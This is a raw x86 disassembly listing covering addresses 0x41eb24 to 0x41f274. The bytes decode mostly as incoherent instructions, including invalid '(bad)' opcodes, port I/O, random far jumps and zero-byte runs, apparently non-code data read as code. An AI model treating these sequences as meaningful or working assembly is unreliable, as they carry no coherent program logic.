  41eb24:	cli    
  41eb25:	outs   dx,BYTE PTR ds:[esi]
  41eb26:	add    ch,al
  41eb28:	out    0xf7,eax
  41eb2a:	pushf  
  41eb2b:	jne    0x41eb29
  41eb2d:	sbb    bh,BYTE PTR [ecx+0x792bc6d6]
  41eb33:	add    dl,BYTE PTR [ebx+0x62]
  41eb36:	in     eax,0x82
  41eb38:	jecxz  0x41eb7b
  41eb3a:	mul    BYTE PTR [edi+0x4b]
  41eb3d:	jmp    0x41ebb5
  41eb3f:	add    dl,BYTE PTR [esi-0x3d]
  41eb42:	cmp    DWORD PTR [ecx-0x254afa8d],ecx
  41eb48:	out    0x30,eax
  41eb4a:	jl     0x41eb4e
  41eb4c:	add    BYTE PTR [edx-0x45],dh
  41eb4f:	mov    BYTE PTR [ebx-0x33],cl
  41eb52:	lds    eax,FWORD PTR ds:[esi+0x310a5aa5]
  41eb59:	sub    DWORD PTR [ecx-0x3c],eax
  41eb5c:	imul   ecx,eax,0x0
  41eb62:	add    BYTE PTR [esi],ah
  41eb64:	aas    
  41eb65:	inc    ebx
  41eb66:	int    0x6a
  41eb68:	adc    dh,BYTE PTR [edi-0x57]
  41eb6b:	jbe    0x41ebe8
  41eb6d:	pop    ebx
  41eb6e:	or     eax,0x5437b51
  41eb73:	popf   
  41eb74:	jnp    0x41ebb9
  41eb76:	or     eax,0x31127599
  41eb7b:	test   dl,al
  41eb7d:	(bad)  
  41eb7e:	dec    DWORD PTR [ecx-0x41]
  41eb81:	jno    0x41ebf1
  41eb83:	es dec esi
  41eb85:	mov    DWORD PTR [eax+edi*2+0x3a],esi
  41eb89:	pop    eax
  41eb8a:	call   0x4225b0
  41eb8f:	inc    ecx
  41eb90:	cmp    esp,DWORD PTR [eax]
  41eb92:	or     BYTE PTR ds:0x1118203b,ah
  41eb98:	cmp    esp,DWORD PTR [eax]
  41eb9a:	dec    eax
  41eb9b:	adc    eax,0x211c203b
  41eba0:	cmp    esp,DWORD PTR [eax]
  41eba2:	add    al,0x5
  41eba4:	cmp    esp,DWORD PTR [eax]
  41eba6:	and    al,0x11
  41eba8:	cmp    esp,DWORD PTR [eax]
  41ebaa:	dec    eax
  41ebab:	pop    esp
  41ebac:	or     DWORD PTR [eax+0x24],0x70
  41ebb0:	mov    ebp,0xa782440
  41ebb5:	add    BYTE PTR [eax],al
  41ebb7:	pop    esp
  41ebb8:	mov    esi,0x602440
  41ebbd:	add    BYTE PTR [eax],al
  41ebbf:	dec    esp
  41ebc0:	mov    esi,0x14c2440
  41ebc5:	add    BYTE PTR [eax],al
  41ebc7:	add    BYTE PTR [eax],al
  41ebc9:	add    BYTE PTR [eax],al
  41ebcb:	add    BYTE PTR [edi+eiz*8+0x24],bl
  41ebcf:	cmp    DWORD PTR [edi+edi*8-0x7a],ecx
  41ebd3:	(bad)  
  41ebd4:	cld    
  41ebd5:	add    DWORD PTR [eax+0x24],0xffffffe0
  41ebd9:	dec    esi
  41ebda:	dec    esp
  41ebdb:	call   0x3dd9aa
  41ebe0:	cdq    
  41ebe1:	mov    edi,0x3ba11270
  41ebe6:	and    BYTE PTR [eax-0x14],cl
  41ebe9:	or     DWORD PTR [eax+0x24],0x20
  41ebed:	mov    BYTE PTR [eax+0x24],al
  41ebf0:	sub    al,0xe7
  41ebf2:	add    BYTE PTR [ecx],bh
  41ebf4:	or     al,0xff
  41ebf6:	cmc    
  41ebf7:	ret    
  41ebf8:	fisub  WORD PTR [edx+0xe]
  41ebfb:	mov    esi,DWORD PTR [ebp+0x25]
  41ebfe:	and    BYTE PTR [eax],dl
  41ec00:	out    dx,al
  41ec01:	adc    eax,0xf074870c
  41ec06:	mov    edi,0xc6f06923
  41ec0b:	or     edi,esp
  41ec0d:	imul   edx,esi,0x4605d888
  41ec13:	pop    es
  41ec14:	jne    0x41ec4c
  41ec16:	(bad)  
  41ec17:	jmp    0x41ec0f
  41ec19:	test   bh,bl
  41ec1b:	push   eax
  41ec1c:	inc    ebx
  41ec1d:	xor    al,0x87
  41ec1f:	inc    edx
  41ec20:	mov    eax,ds:0xa1428738
  41ec25:	sbb    dh,ch
  41ec27:	add    DWORD PTR [esi],ebp
  41ec29:	xchg   ecx,eax
  41ec2a:	adc    eax,0x34eb8afd
  41ec2f:	fld    DWORD PTR [eax]
  41ec31:	add    BYTE PTR [eax],al
  41ec33:	add    BYTE PTR [eax],al
  41ec35:	cmp    al,0x6
  41ec37:	js     0x41eca2
  41ec39:	sub    BYTE PTR [edi+edi*4+0x5a],ch
  41ec3d:	imul   ebx,edi,0xc3cd9fee
  41ec43:	arpl   WORD PTR [ecx],di
  41ec45:	jne    0x41eca2
  41ec47:	jmp    0x5d57:0x6c46e84d
  41ec4e:	sar    DWORD PTR ds:0x40e47500,1
  41ec54:	sbb    BYTE PTR [esi],0xb8
  41ec57:	add    cl,BYTE PTR [ecx+0x4287ac36]
  41ec5d:	aad    0xab
  41ec5f:	jmp    0x1afe:0xea5b9cff
  41ec66:	lea    esp,[esi]
  41ec68:	call   FWORD PTR [edx]
  41ec6a:	fnstsw WORD PTR [edi]
  41ec6c:	adc    esp,DWORD PTR [esi+0x75b3e213]
  41ec72:	pop    ebx
  41ec73:	fstp   DWORD PTR [ebp-0x62]
  41ec76:	and    al,BYTE PTR [ebp+0x52]
  41ec79:	out    dx,al
  41ec7a:	add    dl,bl
  41ec7c:	xchg   dh,bl
  41ec7e:	sub    bh,BYTE PTR [edx]
  41ec80:	rol    BYTE PTR [ecx-0x26],cl
  41ec83:	jmp    0xed7b:0x62027513
  41ec8a:	(bad)  
  41ec8b:	(bad)  
  41ec8c:	xchg   BYTE PTR [edx+0x2],dh
  41ec8f:	push   0x22
  41ec91:	jne    0x41ec6f
  41ec93:	fidivr WORD PTR [edx-0x79]
  41ec96:	dec    edx
  41ec97:	xchg   esp,eax
  41ec98:	mov    BYTE PTR [eax],0x0
  41ec9b:	add    BYTE PTR [eax],al
  41ec9d:	add    BYTE PTR [edx-0x7de00490],bh
  41eca3:	ret    0x8ee6
  41eca6:	ret    0x337b
  41eca9:	jo     0x41eca2
  41ecab:	dec    ebp
  41ecac:	adc    eax,DWORD PTR [ebx]
  41ecae:	addr16 inc edx
  41ecb0:	(bad)  
  41ecb1:	lods   eax,DWORD PTR ds:[esi]
  41ecb2:	xchg   edx,eax
  41ecb3:	jno    0x41ec9b
  41ecb5:	jp     0x41ecbe
  41ecb7:	(bad)  
  41ecb8:	jne    0x41ecca
  41ecba:	inc    ebp
  41ecbb:	adc    esp,DWORD PTR [edi]
  41ecbd:	add    al,0xf
  41ecbf:	sbb    al,ch
  41ecc1:	sar    edi,1
  41ecc3:	(bad)  
  41ecc4:	sub    ch,ch
  41ecc6:	push   0xffffffc1
  41ecc8:	sub    al,0xc0
  41ecca:	pop    ebp
  41eccb:	add    ecx,DWORD PTR [esi+0x10]
  41ecce:	lds    ebx,FWORD PTR [eax]
  41ecd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecd1:	add    edi,edx
  41ecd3:	imul   BYTE PTR [edx]
  41ecd5:	xchg   BYTE PTR [esi],dh
  41ecd7:	(bad)  
  41ecd8:	pop    edi
  41ecd9:	fsub   DWORD PTR [edx]
  41ecdb:	mov    al,0xe6
  41ecdd:	adc    esi,DWORD PTR [ebp+0x2]
  41ece0:	addr16 clc 
  41ece2:	xchg   BYTE PTR [edx],al
  41ece4:	xchg   esp,eax
  41ece5:	push   ss
  41ece6:	inc    dh
  41ece8:	or     dl,bl
  41ecea:	enter  0x9371,0x6f
  41ecee:	sbb    edi,esi
  41ecf0:	out    dx,al
  41ecf1:	jp     0x41ed5a
  41ecf3:	xchg   edx,eax
  41ecf4:	rol    ebx,cl
  41ecf6:	or     bl,BYTE PTR [edi+edi*8-0x25]
  41ecfa:	jg     0x41ecf0
  41ecfc:	pop    ss
  41ecfd:	pop    esp
  41ecfe:	xor    eax,0xf1693d
  41ed03:	add    BYTE PTR [eax],al
  41ed05:	add    BYTE PTR [eax],al
  41ed07:	(bad)  
  41ed08:	ins    DWORD PTR es:[edi],dx
  41ed09:	jb     0x41ecfc
  41ed0b:	push   ebx
  41ed0d:	jecxz  0x41ece5
  41ed0f:	jb     0x41eca7
  41ed11:	adc    ch,BYTE PTR [ecx]
  41ed13:	jno    0x41ec9a
  41ed15:	mov    edi,0x126f713c
  41ed1a:	in     eax,dx
  41ed1b:	popa   
  41ed1c:	ret    0xf3ff
  41ed1f:	and    eax,DWORD PTR [edx]
  41ed21:	add    cl,ch
  41ed23:	retf   
  41ed24:	jnp    0xe8146a56
  41ed2a:	cmp    DWORD PTR [edi+ebp*2],0x79e782fc
  41ed31:	pop    edx
  41ed32:	test   DWORD PTR [edx],ebx
  41ed34:	dec    edx
  41ed35:	jae    0x41ed11
  41ed37:	or     eax,0xca72f3f4
  41ed3c:	add    al,ch
  41ed3e:	mov    al,0xd2
  41ed40:	jo     0x41ed3e
  41ed42:	fs xor esp,esi
  41ed45:	lahf   
  41ed46:	das    
  41ed47:	xor    ch,BYTE PTR [ebx-0x1]
  41ed4a:	pop    ebp
  41ed4b:	pop    edx
  41ed4c:	je     0x41ed35
  41ed4e:	jp     0x41ed78
  41ed50:	jo     0x41ed4e
  41ed52:	imul   esp,DWORD PTR [edx+0x6b],0x7980bbff
  41ed59:	inc    edx
  41ed5a:	fxch   st(5)
  41ed5c:	pop    ds
  41ed5d:	call   0xfcb1f5cc
  41ed62:	arpl   dx,di
  41ed64:	push   0x5c
  41ed66:	(bad)  
  41ed67:	push   ecx
  41ed68:	dec    ecx
  41ed69:	shl    ebp,0x0
  41ed6c:	add    BYTE PTR [eax],al
  41ed6e:	add    BYTE PTR [eax],al
  41ed70:	jbe    0x41ed45
  41ed72:	mov    BYTE PTR ds:0x6af763f8,al
  41ed78:	lea    esi,[ebx]
  41ed7a:	add    DWORD PTR [eax],0xff080fc8
  41ed80:	out    dx,eax
  41ed81:	jle    0x41ed9c
  41ed83:	sbb    BYTE PTR [esi],bl
  41ed85:	inc    esp
  41ed86:	cld    
  41ed87:	push   ebp
  41ed88:	jecxz  0x41ede5
  41ed8a:	dec    eax
  41ed8b:	int3   
  41ed8c:	lahf   
  41ed8d:	push   es
  41ed8e:	xchg   eax,edi
  41ed90:	retf   
  41ed91:	(bad)  
  41ed92:	xchg   DWORD PTR [edi],esi
  41ed94:	mov    ah,0x26
  41ed96:	idiv   bh
  41ed98:	stos   DWORD PTR es:[edi],eax
  41ed99:	xchg   ah,dh
  41ed9b:	dec    ebx
  41ed9d:	out    dx,eax
  41ed9e:	cld    
  41ed9f:	add    esp,ebx
  41eda1:	add    eax,DWORD PTR [edi+0x3fba300d]
  41eda7:	add    BYTE PTR [edi],dh
  41eda9:	(bad)  
  41edaa:	and    al,0x8d
  41edac:	sar    bl,1
  41edae:	cs leave 
  41edb0:	xchg   ebp,eax
  41edb1:	cmp    DWORD PTR [eax],edx
  41edb3:	movhlps xmm3,xmm4
  41edb6:	std    
  41edb7:	dec    DWORD PTR [esi+eax*4+0x609d147a]
  41edbe:	push   cs
  41edbf:	mov    edx,DWORD PTR [edx+0x16]
  41edc2:	xor    eax,0x65f9048
  41edc7:	mov    edx,DWORD PTR [edx+0x22]
  41edca:	test   DWORD PTR [edi],eax
  41edcc:	(bad)
  41edcf:	call   FWORD PTR [esi+edi*2+0x41]
  41edd3:	adc    BYTE PTR [eax],al
  41edd5:	add    BYTE PTR [eax],al
  41edd7:	add    BYTE PTR [eax],al
  41edd9:	xchg   ebx,eax
  41eddb:	jo     0x41eddf
  41eddd:	aad    0xfb
  41eddf:	jle    0x41ee5f
  41ede1:	pop    eax
  41ede2:	jmp    0x0:0x432850b
  41ede9:	xlat   BYTE PTR ds:[ebx]
  41edea:	inc    ecx
  41edeb:	add    al,0xc6
  41eded:	adc    ch,BYTE PTR [edi-0x3]
  41edf0:	mov    ebp,0x3fc6e8
  41edf5:	loop   0x41ee72
  41edf7:	inc    eax
  41edf8:	and    al,0x75
  41edfa:	jne    0x41ee73
  41edfc:	adc    bh,BYTE PTR [ecx+0x6b]
  41edff:	sar    bh,0x13
  41ee02:	out    dx,al
  41ee03:	sbb    BYTE PTR [ebx-0x2d3ba4f],cl
  41ee09:	mov    BYTE PTR [ebp-0x30],cl
  41ee0c:	cld    
  41ee0d:	add    DWORD PTR [ebp+0x1c],0xbffd398b
  41ee14:	cld    
  41ee15:	mov    ds:0xe2fdee51,al
  41ee1a:	push   edi
  41ee1b:	int    0x87
  41ee1d:	xor    DWORD PTR ds:0xf3a6fd0d,eax
  41ee23:	sub    al,0xe8
  41ee25:	in     al,dx
  41ee26:	mov    ch,0x74
  41ee28:	cld    
  41ee29:	out    dx,al
  41ee2a:	test   al,0x80
  41ee2c:	std    
  41ee2d:	mov    edx,0x748b7c4f
  41ee32:	pop    ecx
  41ee33:	add    BYTE PTR [eax+0x114529],al
  41ee39:	jb     0x41ee18
  41ee3b:	xchg   edx,eax
  41ee3c:	inc    BYTE PTR [eax]
  41ee3e:	add    BYTE PTR [eax],al
  41ee40:	add    BYTE PTR [eax],al
  41ee42:	call   0x2f5c:0x5df5e958
  41ee49:	fs mov ecx,0x398b041b
  41ee4f:	cmp    eax,0x26b3501c
  41ee54:	add    BYTE PTR [eax],al
  41ee56:	jb     0x41ee65
  41ee58:	ins    BYTE PTR es:[edi],dx
  41ee59:	sbb    eax,0x8b005a7d
  41ee5e:	mov    cl,0xff
  41ee60:	daa    
  41ee61:	dec    edi
  41ee62:	in     al,dx
  41ee63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee64:	sbb    al,0x24
  41ee66:	(bad)  
  41ee67:	pop    esp
  41ee68:	out    0xfe,al
  41ee6a:	mov    edx,0x740658d3
  41ee6f:	pop    ebx
  41ee70:	mov    eax,DWORD PTR [ebx-0x6f]
  41ee73:	add    ecx,DWORD PTR [ecx+0x70028545]
  41ee79:	rcl    BYTE PTR [esi+0x2a],0x72
  41ee7d:	mov    esi,0x8d323186
  41ee82:	mov    dh,0x26
  41ee84:	retf   
  41ee85:	cmp    al,0xb1
  41ee87:	mov    DWORD PTR es:[esi],0x3e6a5f1
  41ee8e:	jne    0x41ef0f
  41ee90:	stos   BYTE PTR es:[edi],al
  41ee91:	pop    ds
  41ee92:	push   ebp
  41ee93:	sar    dh,cl
  41ee95:	mov    eax,DWORD PTR [ecx]
  41ee97:	outs   dx,BYTE PTR ds:[esi]
  41ee98:	in     eax,0x7f
  41ee9a:	sub    bh,dh
  41ee9c:	bound  edx,QWORD PTR [eax-0x1619921e]
  41eea2:	jnp    0x41ef11
  41eea4:	adc    eax,0x6c
  41eea9:	add    BYTE PTR [eax],al
  41eeab:	xor    eax,0xfc03e7fa
  41eeb0:	push   0x1
  41eeb2:	jnp    0x41eefa
  41eeb4:	or     ecx,DWORD PTR [ebp+0x3d]
  41eeb7:	pop    eax
  41eeb8:	neg    ah
  41eeba:	jbe    0x41eee2
  41eebc:	(bad)  es:[esi+0x26]
  41eec0:	es ror esi,cl
  41eec3:	call   0x7ed5:0x7504e5b1
  41eeca:	and    eax,0x76e702c7
  41eecf:	push   es
  41eed0:	es (bad) 
  41eed2:	mov    dh,BYTE PTR [esi]
  41eed4:	es mov edi,0x4f3692d2
  41eeda:	add    esi,DWORD PTR [ebp+0x7b]
  41eedd:	stos   BYTE PTR es:[edi],al
  41eede:	pop    ds
  41eedf:	lea    ebp,[ecx]
  41eee1:	sub    ch,bh
  41eee3:	leave  
  41eee4:	stos   BYTE PTR es:[edi],al
  41eee5:	out    0x13,al
  41eee7:	jne    0x41eeeb
  41eee9:	pusha  
  41eeea:	mov    edi,0x4e4f0e96
  41eeef:	sbb    eax,DWORD PTR [edx]
  41eef1:	out    0x8a,eax
  41eef3:	dec    edx
  41eef4:	sub    DWORD PTR [eax],eax
  41eef6:	xor    cl,BYTE PTR [edx+0x2b]
  41eef9:	mov    esp,DWORD PTR [ebp-0x41aff16e]
  41eeff:	mov    ds:0x63c923f1,eax
  41ef04:	push   es
  41ef05:	push   eax
  41ef06:	jmp    0xf53ef181
  41ef0b:	xchg   edx,eax
  41ef0c:	adc    BYTE PTR [eax-0x17],al
  41ef0f:	add    BYTE PTR [eax],al
  41ef11:	add    BYTE PTR [eax],al
  41ef13:	add    ch,dh
  41ef15:	lods   al,BYTE PTR ds:[esi]
  41ef16:	jae    0x41eefb
  41ef18:	out    dx,eax
  41ef19:	lds    eax,FWORD PTR [edi]
  41ef1b:	mov    dl,0xb7
  41ef1d:	icebp  
  41ef1e:	adc    BYTE PTR [edi-0x88bf54f],al
  41ef24:	popa   
  41ef25:	icebp  
  41ef26:	and    edx,DWORD PTR ds:0x1d23f168
  41ef2c:	shl    DWORD PTR [esp+ecx*2-0x22],0x77
  41ef31:	add    dl,BYTE PTR [ebp-0x2f]
  41ef34:	aas    
  41ef35:	pushf  
  41ef36:	(bad)  
  41ef37:	call   0xd165e085
  41ef3c:	dec    esi
  41ef3d:	lods   al,BYTE PTR ds:[esi]
  41ef3e:	scas   al,BYTE PTR es:[edi]
  41ef3f:	jmp    0xcdb55eba
  41ef44:	push   esi
  41ef45:	pop    edx
  41ef46:	mov    bh,0x58
  41ef48:	jns    0x41ef4c
  41ef4a:	std    
  41ef4b:	sbb    eax,0x3ee81a55
  41ef50:	(bad)  
  41ef51:	ins    BYTE PTR es:[edi],dx
  41ef52:	cld    
  41ef53:	jb     0x41ef0a
  41ef55:	and    BYTE PTR [eax],dh
  41ef57:	jo     0x41ef1c
  41ef59:	adc    al,0x89
  41ef5b:	sub    eax,0x27873655
  41ef60:	lea    edi,[ecx+0x45]
  41ef63:	add    eax,0xd5fc73f4
  41ef68:	inc    esi
  41ef69:	sbb    eax,DWORD PTR [esi+0x9]
  41ef6c:	in     al,dx
  41ef6d:	jae    0x41efe2
  41ef6f:	adc    esp,esi
  41ef71:	call   0x5d9def7d
  41ef76:	push   cs
  41ef77:	push   0x0
  41ef7c:	add    BYTE PTR [eax+edx*1+0x0],cl
  41ef80:	add    ah,al
  41ef82:	push   es
  41ef83:	and    BYTE PTR [eax],al
  41ef85:	sbb    al,0xd8
  41ef87:	(bad)  
  41ef88:	cmp    DWORD PTR [eax+eax*1],ebx
  41ef8b:	test   DWORD PTR [ebp+0x10],eax
  41ef8e:	sub    DWORD PTR [ecx+0xc],edi
  41ef91:	adc    eax,DWORD PTR [edx+0x79]
  41ef94:	or     al,0x9f
  41ef96:	jae    0x41ef9c
  41ef98:	add    BYTE PTR [eax+0x14468712],cl
  41ef9e:	add    eax,DWORD PTR [esi+0x20]
  41efa1:	fisttp DWORD PTR [edi-0x5]
  41efa4:	jne    0x41ef7a
  41efa6:	xlat   BYTE PTR ds:[ebx]
  41efa7:	xchg   ebp,eax
  41efa8:	mov    cl,0xdc
  41efaa:	(bad)  
  41efab:	cld    
  41efac:	jge    0x41f01a
  41efae:	jns    0x41eff1
  41efb0:	adc    BYTE PTR [ecx-0x41],cl
  41efb3:	jo     0x41efb7
  41efb5:	push   ebp
  41efb6:	daa    
  41efb7:	ret    
  41efb8:	inc    esp
  41efb9:	js     0x41efcd
  41efbb:	std    
  41efbc:	dec    esp
  41efbe:	jmp    DWORD PTR [edi+0x4c]
  41efc1:	adc    BYTE PTR [ebx-0x4],al
  41efc4:	dec    cl
  41efc6:	adc    edx,DWORD PTR [edx]
  41efc8:	inc    eax
  41efc9:	pushf  
  41efca:	jp     0x41f00c
  41efcc:	and    al,0xa8
  41efce:	push   esi
  41efcf:	pop    edx
  41efd0:	pop    ebx
  41efd1:	pop    ss
  41efd2:	int3   
  41efd3:	pop    ecx
  41efd4:	ret    0xff88
  41efd7:	jg     0x41f055
  41efd9:	mov    eax,0x97740012
  41efde:	div    BYTE PTR [eax+0x24]
  41efe1:	add    BYTE PTR [eax],al
  41efe3:	add    BYTE PTR [eax],al
  41efe5:	add    BYTE PTR [edi+edx*8-0xa34ee3],bh
  41efec:	jle    0x41efec
  41efee:	rcr    DWORD PTR [ebx+0x9],cl
  41eff1:	mov    eax,ds:0x3fc338
  41eff6:	jne    0x41f038
  41eff8:	push   0x27
  41effa:	cmp    esp,DWORD PTR [ebp-0x278afc06]
  41f000:	fsub   QWORD PTR [ebx]
  41f002:	imul   ebx,DWORD PTR [ecx-0x18],0x598be3
  41f009:	std    
  41f00a:	mov    BYTE PTR [ebp+0xe],dh
  41f00d:	inc    eax
  41f00e:	jne    0x41f020
  41f010:	lods   eax,DWORD PTR ds:[esi]
  41f011:	push   edx
  41f012:	out    dx,al
  41f013:	cld    
  41f014:	jg     0x41f001
  41f016:	test   DWORD PTR [eax-0x1f54bc1a],ebp
  41f01c:	pop    eax
  41f01d:	out    0x14,eax
  41f01f:	sub    al,BYTE PTR [ecx]
  41f021:	add    dh,ch
  41f023:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f024:	or     ch,al
  41f026:	jae    0x41f082
  41f028:	add    BYTE PTR [eax],al
  41f02a:	jne    0x41f00e
  41f02c:	mov    edx,0xf763f003
  41f031:	xor    bl,ch
  41f033:	xchg   edi,eax
  41f034:	add    dh,BYTE PTR [ebx-0x6b]
  41f037:	fsubr  DWORD PTR [ebx+eax*1+0x4b]
  41f03b:	jo     0x41efc0
  41f03d:	cmp    al,0x5d
  41f03f:	pop    ecx
  41f040:	hlt    
  41f041:	dec    DWORD PTR [ecx+0x48]
  41f044:	push   ebx
  41f045:	call   0x50ff4999
  41f04a:	add    BYTE PTR [eax],al
  41f04c:	add    BYTE PTR [eax],al
  41f04e:	add    BYTE PTR [edx-0x41],cl
  41f051:	add    eax,DWORD PTR [edi+0x3258754b]
  41f057:	dec    ebx
  41f058:	pop    ecx
  41f059:	add    cl,ch
  41f05b:	jge    0x41f043
  41f05d:	(bad)  
  41f05e:	cld    
  41f05f:	sub    ah,dl
  41f061:	leave  
  41f062:	or     ebx,DWORD PTR [ebp-0x7d007443]
  41f068:	(bad)  
  41f069:	std    
  41f06a:	mov    ch,BYTE PTR [ebx]
  41f06c:	ror    DWORD PTR gs:[edi+0x5d],cl
  41f070:	inc    eax
  41f071:	push   es
  41f072:	jmp    FWORD PTR [edx+0x3]
  41f075:	jo     0x41f041
  41f077:	jp     0x41f0f8
  41f079:	es stc 
  41f07b:	jno    0x41f0b1
  41f07d:	daa    
  41f07e:	pop    ebp
  41f07f:	inc    edi
  41f080:	add    esp,edi
  41f082:	add    edi,esi
  41f084:	rcr    dl,0xd3
  41f087:	imul   DWORD PTR [ecx-0x13]
  41f08a:	mov    BYTE PTR [edi],dl
  41f08c:	add    esp,edi
  41f08e:	add    ebx,DWORD PTR [ebp-0xafc18db]
  41f094:	imul   ebx,DWORD PTR [ebx-0x1ac7e505],0x5fd17504
  41f09e:	retf   0x7782
  41f0a1:	mov    ds:0xab77ba6f,eax
  41f0a6:	jae    0x41f05a
  41f0a8:	fmul   st(3),st
  41f0aa:	jb     0x41f033
  41f0ac:	cli    
  41f0ad:	sub    eax,0xe6fbeec9
  41f0b2:	add    eax,DWORD PTR [eax]
  41f0b4:	add    BYTE PTR [eax],al
  41f0b6:	add    BYTE PTR [eax],al
  41f0b8:	jne    0x41f123
  41f0ba:	sti    
  41f0bb:	inc    ebx
  41f0bc:	xchg   edx,eax
  41f0be:	out    0x86,al
  41f0c0:	loop   0x41f0c5
  41f0c2:	pop    esp
  41f0c3:	sbb    BYTE PTR [edx+0x79f9cabf],cl
  41f0c9:	add    BYTE PTR [ebx+0x74],0x32
  41f0cd:	out    dx,eax
  41f0ce:	inc    ecx
  41f0cf:	xchg   DWORD PTR [edi],edi
  41f0d1:	jmp    0x247a:0xdef8
  41f0d7:	or     al,0xfe
  41f0d9:	rol    dh,0xd3
  41f0dc:	sbb    al,BYTE PTR [ebx]
  41f0de:	out    0x3,eax
  41f0e0:	cmc    
  41f0e1:	imul   ebx,DWORD PTR [ebx],0xe57f9afc
  41f0e7:	add    al,0x75
  41f0e9:	jnp    0x41f117
  41f0eb:	adc    ah,ch
  41f0ed:	mov    edi,0x693280d6
  41f0f2:	jmp    DWORD PTR [edi-0x1f]
  41f0f5:	data16 cld 
  41f0f7:	fidiv  WORD PTR [esi-0x11]
  41f0fa:	or     dh,BYTE PTR [edx+0x35]
  41f0fd:	std    
  41f0fe:	xor    BYTE PTR [eax],0x62
  41f101:	inc    DWORD PTR [esi+0x45819aa7]
  41f107:	add    DWORD PTR [ebx],ebp
  41f109:	or     eax,0x613ebcfd
  41f10e:	std    
  41f10f:	in     al,0x71
  41f111:	add    cl,BYTE PTR [ecx+0x7349fd11]
  41f117:	xchg   edi,eax
  41f118:	sbb    al,0x82
  41f11a:	cmp    cl,ch
  41f11c:	add    BYTE PTR [eax],al
  41f11e:	add    BYTE PTR [eax],al
  41f120:	add    BYTE PTR [edx],ch
  41f122:	mov    ecx,0xf4a7fc69
  41f127:	pop    es
  41f128:	add    DWORD PTR [esi-0x21700fc],ebp
  41f12e:	test   al,0x73
  41f130:	lds    ecx,FWORD PTR [edx+eax*4]
  41f133:	aaa    
  41f134:	jmp    0x97c9203b
  41f139:	xchg   edx,eax
  41f13a:	add    DWORD PTR [ebp-0x47],0x5cfd2b4b
  41f141:	loope  0x41f1a3
  41f143:	pop    edx
  41f144:	in     al,0x77
  41f146:	add    al,BYTE PTR [edi+0x4540692f]
  41f14c:	icebp  
  41f14d:	jbe    0x41f1aa
  41f14f:	mov    edx,0x4458d269
  41f154:	out    dx,al
  41f155:	repz sbb edi,ebp
  41f158:	mov    dh,0x24
  41f15a:	cmp    BYTE PTR [edx-0x53],0x70
  41f15e:	test   DWORD PTR [edx-0x399da36],0x10afa7
  41f168:	add    BYTE PTR [esi-0x5e71039b],0x60
  41f16f:	stos   DWORD PTR es:[edi],eax
  41f170:	add    BYTE PTR [ebx],ch
  41f172:	(bad)  
  41f173:	call   DWORD PTR [edx-0x1c]
  41f176:	fwait
  41f177:	stos   DWORD PTR es:[edi],eax
  41f178:	add    BYTE PTR [esp+ecx*8-0x30],bl
  41f17c:	jecxz  0x41f158
  41f17e:	icebp  
  41f17f:	test   DWORD PTR [esi+0xc],eax
  41f182:	mov    ah,0xfd
  41f184:	pop    edx
  41f185:	add    BYTE PTR [eax],al
  41f187:	add    BYTE PTR [eax],al
  41f189:	add    BYTE PTR [ebp+0x110008c0],ah
  41f18f:	out    0xe8,eax
  41f191:	xor    DWORD PTR [eax+0x38ec7fd6],0xffffffe7
  41f198:	inc    ecx
  41f199:	adc    al,0xdf
  41f19b:	dec    ecx
  41f19c:	push   ebx
  41f19d:	jmp    FWORD PTR [edi+eiz*8]
  41f1a0:	inc    ecx
  41f1a1:	adc    BYTE PTR [ebx+0x2e],bl
  41f1a4:	xchg   DWORD PTR [ebp+0x28],eax
  41f1a7:	repz jno 0x41f1b2
  41f1aa:	(bad)  
  41f1ab:	and    eax,0xe7658bfc
  41f1b0:	jo     0x41f1d6
  41f1b2:	call   0x2c664aa3
  41f1b7:	int3   
  41f1b8:	push   0x80f2fbfe
  41f1bd:	rcr    bl,0x7f
  41f1c0:	sbb    al,BYTE PTR [edx]
  41f1c2:	fadd   QWORD PTR [ebx]
  41f1c4:	xchg   DWORD PTR [ebp-0x1c],eax
  41f1c7:	retf   
  41f1c8:	pop    esi
  41f1c9:	cmc    
  41f1ca:	mov    ebx,0x804484f2
  41f1cf:	add    DWORD PTR [edi-0x3f39733a],eax
  41f1d5:	cmp    DWORD PTR [ebx+0x704485f2],0x7001a7f6
  41f1df:	punpckhbw mm7,QWORD PTR [eax-0x55]
  41f1e3:	add    eax,DWORD PTR [eax]
  41f1e5:	jmp    DWORD PTR [ecx-0x73bfedd1]
  41f1eb:	jle    0x41f24d
  41f1ed:	and    al,0x0
  41f1ef:	add    BYTE PTR [eax],al
  41f1f1:	add    BYTE PTR [eax],al
  41f1f3:	jne    0x41f25a
  41f1f5:	add    bh,ah
  41f1f7:	cwde   
  41f1f8:	pop    edx
  41f1f9:	add    BYTE PTR [eax],al
  41f1fb:	int    0x5b
  41f1fd:	inc    DWORD PTR [ebx+0x5af7]
  41f203:	div    ah
  41f205:	daa    
  41f206:	adc    BYTE PTR [ebp-0x54],dh
  41f209:	jbe    0x41f250
  41f20b:	cmp    edx,DWORD PTR [ebp+0x22740e24]
  41f211:	clc    
  41f212:	and    edx,ecx
  41f214:	inc    esi
  41f215:	mov    edx,0xebfdb988
  41f21a:	cmp    BYTE PTR [ebp+edx*2-0x294a8c00],0xc4
  41f222:	and    esi,DWORD PTR [ebp+0x5123ecde]
  41f228:	ror    DWORD PTR [edi+ecx*4],0x22
  41f22c:	and    BYTE PTR [ebp+0x7d4fa1bf],al
  41f232:	inc    ebx
  41f233:	pop    ecx
  41f234:	dec    ecx
  41f235:	shl    bh,1
  41f237:	and    al,0x23
  41f239:	outs   dx,DWORD PTR ds:[esi]
  41f23a:	cld    
  41f23b:	add    ah,ch
  41f23d:	and    al,0x28
  41f23f:	or     eax,0xf2ff9f00
  41f244:	outs   dx,DWORD PTR ds:[esi]
  41f245:	cmc    
  41f246:	and    esp,DWORD PTR [ebp-0x79fbeda8]
  41f24c:	sbb    DWORD PTR [ecx+ecx*4],eax
  41f24f:	xor    ebp,edi
  41f251:	pop    ds
  41f252:	xchg   DWORD PTR [ecx],edi
  41f254:	cmc    
  41f255:	adc    eax,DWORD PTR [ebx+0x0]
  41f25b:	add    BYTE PTR [ebp+0x4986fecc],dh
  41f261:	cmc    
  41f262:	pop    ss
  41f263:	jmp    0x2431cbb9
  41f268:	sbb    BYTE PTR [ecx-0x9],0x4
  41f26c:	mov    bl,0x1c
  41f26e:	sub    BYTE PTR [esi],cl
  41f270:	jne    0x41f274
  41f272:	xchg   edx,eax
  41f273:	(bad)  
  41f274:	or     al,0x21
